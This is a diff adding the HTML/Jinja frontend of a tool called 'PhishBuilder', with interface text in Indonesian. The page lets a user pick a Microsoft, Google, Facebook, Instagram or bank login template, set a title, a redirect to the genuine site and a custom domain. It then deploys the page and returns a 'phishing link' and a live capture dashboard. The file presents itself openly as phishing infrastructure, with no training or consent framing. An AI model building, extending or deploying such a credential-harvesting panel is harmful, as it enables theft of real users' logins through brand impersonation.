@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PhishBuilder — Create</title>
+<style>
+  :root {
+    --bg: #0f1117; --card: #1a1d27; --border: #2a2e3b;
+    --text: #e4e6ed; --muted: #8b90a0; --accent: #6366f1; --accent2: #22c55e;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--bg); color: var(--text); font-family: 'Inter', system-ui, sans-serif; min-height: 100vh; }
+  nav { display: flex; align-items: center; justify-content: space-between; padding: 16px 32px; border-bottom: 1px solid var(--border); background: var(--card); }
+  .logo { font-weight: 700; font-size: 18px; }
+  .logo span { color: var(--accent); }
+  .nav-links a { color: var(--muted); text-decoration: none; margin-left: 24px; font-size: 14px; }
+  .nav-links a:hover, .nav-links a.active { color: var(--text); }
+  .container { max-width: 800px; margin: 0 auto; padding: 40px 24px; }
+  h1 { font-size: 26px; font-weight: 700; margin-bottom: 8px; }
+  .sub { color: var(--muted); margin-bottom: 32px; }
+  .form-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 32px; }
+  label { display: block; font-size: 13px; font-weight: 500; margin-bottom: 6px; color: var(--muted); }
+  input, select { width: 100%; padding: 12px 14px; background: var(--bg); border: 1px solid var(--border); border-radius: 8px; color: var(--text); font-size: 14px; margin-bottom: 20px; outline: none; }
+  input:focus, select:focus { border-color: var(--accent); }
+  .templates { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 12px; margin-bottom: 24px; }
+  .tpl { border: 2px solid var(--border); border-radius: 10px; padding: 16px 12px; text-align: center; cursor: pointer; transition: all .15s; font-size: 13px; }
+  .tpl:hover { border-color: var(--accent); }
+  .tpl.active { border-color: var(--accent); background: rgba(99,102,241,.1); }
+  .tpl .name { font-weight: 600; margin-top: 6px; }
+  .btn { display: inline-flex; padding: 12px 24px; border-radius: 8px; font-size: 14px; font-weight: 600; border: none; cursor: pointer; background: var(--accent); color: #fff; }
+  .btn:hover { background: #4f46e5; }
+  .btn:disabled { opacity: .6; cursor: not-allowed; }
+  .result { margin-top: 24px; padding: 20px; background: rgba(34,197,94,.1); border: 1px solid var(--accent2); border-radius: 10px; display: none; }
+  .result a { color: var(--accent2); word-break: break-all; }
+</style>
+</head>
+<body>
+<nav>
+  <div class="logo">Phish<span>Builder</span></div>
+  <div class="nav-links">
+    <a href="/">Home</a>
+    <a href="/create" class="active">Create</a>
+    <a href="/logout" style="color:#ef4444">Logout</a>
+  </div>
+</nav>
+<div class="container">
+  <h1>Create Phishing Page</h1>
+  <p class="sub">Pilih template, isi judul, deploy langsung. Mirip Vercel / Netlify.</p>
+
+  <div class="form-card">
+    <label>Pilih Template</label>
+    <div class="templates" id="templates">
+      {% for key, t in templates.items() %}
+      <div class="tpl {% if loop.first %}active{% endif %}" data-val="{{ key }}" onclick="selectTpl(this)">
+        <div style="font-size:28px">{{ '🪟' if key=='microsoft' else '🔍' if key=='google' else '📘' if key=='facebook' else '📷' if key=='instagram' else '🏦' }}</div>
+        <div class="name">{{ t.name }}</div>
+      </div>
+      {% endfor %}
+    </div>
+
+    <label>Judul Page</label>
+    <input type="text" id="title" placeholder="Contoh: Microsoft Login 2026" value="Sign in">
+
+    <label>Redirect setelah login (URL asli)</label>
+    <input type="url" id="redirect" placeholder="https://www.microsoft.com" value="https://www.microsoft.com">
+
+    <label>Custom Domain (opsional)</label>
+    <input type="text" id="custom_domain" placeholder="login-secure.example.com">
+
+    <button class="btn" id="btn" onclick="createPage()">Deploy Page</button>
+
+    <div class="result" id="result">
+      <strong style="color:var(--accent2)">Page berhasil dibuat!</strong><br><br>
+      Link phishing: <a id="phish-link" target="_blank"></a><br>
+      Live panel: <a id="dash-link" target="_blank"></a>
+    </div>
+  </div>
+</div>
+<script>
+let selected = "microsoft";
+function selectTpl(el) {
+  document.querySelectorAll(".tpl").forEach(t => t.classList.remove("active"));
+  el.classList.add("active");
+  selected = el.dataset.val;
+}
+async function createPage() {
+  const btn = document.getElementById("btn");
+  btn.disabled = true;
+  btn.textContent = "Deploying...";
+  const res = await fetch("/create", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      title: document.getElementById("title").value,
+      template: selected,
+      redirect: document.getElementById("redirect").value,
+      custom_domain: document.getElementById("custom_domain").value
+    })
+  });
+  const data = await res.json();
+  if (data.ok) {
+    document.getElementById("result").style.display = "block";
+    document.getElementById("phish-link").href = data.url;
+    document.getElementById("phish-link").textContent = location.origin + data.url;
+    document.getElementById("dash-link").href = "/dashboard/" + data.page_id;
+    document.getElementById("dash-link").textContent = location.origin + "/dashboard/" + data.page_id;
+  }
+  btn.disabled = false;
+  btn.textContent = "Deploy Page";
+}
+</script>
+</body>
+</html>
